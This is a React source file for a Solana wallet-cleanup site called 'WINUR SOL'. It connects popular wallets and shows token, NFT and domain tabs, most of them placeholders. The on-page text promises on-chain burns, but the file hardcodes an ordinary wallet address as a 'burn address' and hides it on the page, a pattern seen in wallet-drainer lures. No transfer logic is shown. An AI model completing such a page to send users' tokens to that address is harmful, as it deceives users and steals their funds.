import React, { useMemo, useState } from "react";
import {
  ConnectionProvider,
  WalletProvider,
} from "@solana/wallet-adapter-react";
import { WalletModalProvider, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  TorusWalletAdapter,
  SolletWalletAdapter,
} from "@solana/wallet-adapter-wallets";
import "@solana/wallet-adapter-react-ui/styles.css";

const RPC = "https://api.mainnet-beta.solana.com";
const BURN_ADDRESS = "GiLefarGmT5zvaeiFiLNmrckRen3MNjrXQ8fHCtAdN3s";

export default function App() {
  const [tab, setTab] = useState("cleanup");
  const wallets = useMemo(
    () => [
      new PhantomWalletAdapter(),
      new SolflareWalletAdapter(),
      new SolletWalletAdapter(),
      new TorusWalletAdapter(),
    ],
    []
  );

  return (
    <ConnectionProvider endpoint={RPC}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <div className="page">
            <header className="topbar">
              <h1 className="logo">
                <span className="winur">WINUR</span>
                <span className="sol">SOL</span>
                <span className="sub"> — a sol project</span>
              </h1>
              <div className="wallet-center">
                <WalletMultiButton className="wallet-btn" />
              </div>
            </header>

            <div className="ticker">
              <div className="ticker-inner">
                Any tokens marked for burn will be destroyed using on-chain burn
                instructions. This process cannot be reversed. Make sure you have
                the correct assets selected!
              </div>
            </div>

            <nav className="tabs">
              {["cleanup", "tokens", "nfts", "cnfts", "domains"].map((k) => (
                <button
                  key={k}
                  className={`tab ${tab === k ? "active" : ""}`}
                  onClick={() => setTab(k)}
                >
                  {k.toUpperCase()}
                </button>
              ))}
            </nav>

            <main className="panel">
              {tab === "cleanup" && (
                <section>
                  <h2 className="headline">All clean!</h2>
                  <p className="muted">
                    No empty accounts or serum accounts found. Ensure you have
                    the correct wallet selected.
                  </p>
                  <div className="slug-box"></div>
                  <div className="note">
                    Can’t find a token you’re looking for? It may be in the
                    “Unknown” tab (pro mode). This happens when we can’t fetch
                    token metadata and hide it to prevent accidental burns.
                  </div>
                  <div className="hidden">Burn address: {BURN_ADDRESS}</div>
                </section>
              )}
              {tab === "tokens" && (
                <section>
                  <h2 className="headline">TOKENS</h2>
                  <p className="muted">SPL token accounts list will be here.</p>
                </section>
              )}
              {tab === "nfts" && (
                <section>
                  <h2 className="headline">NFTS</h2>
                  <p className="muted">NFT list & actions.</p>
                </section>
              )}
              {tab === "cnfts" && (
                <section>
                  <h2 className="headline">CNFTS</h2>
                  <p className="muted">Compressed NFTs placeholder.</p>
                </section>
              )}
              {tab === "domains" && (
                <section>
                  <h2 className="headline">DOMAINS</h2>
                  <p className="muted">SNS domains placeholder.</p>
                </section>
              )}
            </main>

            <footer className="footer">
              <div className="switches">
                <span className="chip on">Lite</span>
                <span className="chip">Pro</span>
              </div>
              <div className="help">What does cleanup do?</div>
            </footer>
          </div>
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}
